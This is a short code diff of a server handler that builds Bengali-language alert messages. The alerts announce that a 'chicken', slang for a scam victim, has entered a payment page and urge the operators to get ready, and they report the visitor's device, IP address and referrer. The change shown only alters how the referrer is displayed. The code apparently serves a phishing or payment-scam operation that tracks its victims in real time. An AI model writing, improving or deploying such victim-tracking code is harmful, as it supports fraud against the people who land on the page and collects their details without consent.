@@ -56,7 +56,7 @@ serve(async (req) => {
             `-------------------\n\n` +
             `🐔মুরগির Device : ${device}\n` +
             `🐔মুরগির IP : ${clientIp}\n` +
-            `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+            `🐔মুরগির Referrer : ${displayReferrer}`;
         } else {
           message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
             `-------------------\n\n` +
@@ -64,7 +64,7 @@ serve(async (req) => {
             `-------------------\n\n` +
             `🐔মুরগির Device : ${device}\n` +
             `🐔মুরগির IP : ${clientIp}\n` +
-            `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+            `🐔মুরগির Referrer : ${displayReferrer}`;
         }
       } else {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
@@ -76,7 +76,7 @@ serve(async (req) => {
           `-------------------\n\n` +
           `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
-          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+          `🐔মুরগির Referrer : ${displayReferrer}`;
       }
     } else if (type === 'page_entry') {
       message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
